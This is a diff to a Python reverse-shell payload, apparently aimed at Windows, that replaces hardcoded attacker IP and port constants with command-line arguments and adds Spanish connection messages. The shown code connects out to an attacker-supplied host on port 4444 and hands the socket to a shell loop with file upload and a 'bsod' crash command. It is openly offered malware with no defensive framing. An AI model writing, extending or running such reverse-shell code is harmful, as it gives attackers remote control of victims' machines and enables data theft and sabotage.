@@ -3,11 +3,8 @@ import subprocess
 import os
 import ctypes
 import time
-
-
-ATTACKER_IP = "IP ATTACKER"
-PORT = 4444
-BUFFER_SIZE = 8192
+import argparse
+import sys
 
 
 def send_output(conn, output):
@@ -84,7 +81,6 @@ def shell(conn):
                 filename = command.split(maxsplit=1)[1]
                 handle_upload(conn, filename)
                 continue
-            # ===========================================================
 
             if command.lower() == "bsod":
                 try:
@@ -130,14 +126,30 @@ def shell(conn):
 
 
 def main():
+    
+    parser = argparse.ArgumentParser(description="Payload Reverse Shell")
+    parser.add_argument('--ip', required=True, help='IP attacker (obligatory)')
+    parser.add_argument('--port', type=int, default=4444, help='Port (default: 4444)')
+    
+    args = parser.parse_args()
+
+    ATTACKER_IP = args.ip
+    PORT = args.port
+    # ============================================================
+
+    BUFFER_SIZE = 8192
+
+    print(f"[+] Conectando a {ATTACKER_IP}:{PORT}...")
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ATTACKER_IP, PORT))
+        print("[+] Conexión establecida!")
         
         shell(s)
         
-    except:
-        pass
+    except Exception as e:
+        print(f"[-] Error de conexión: {e}")
     finally:
         try:
             s.close()
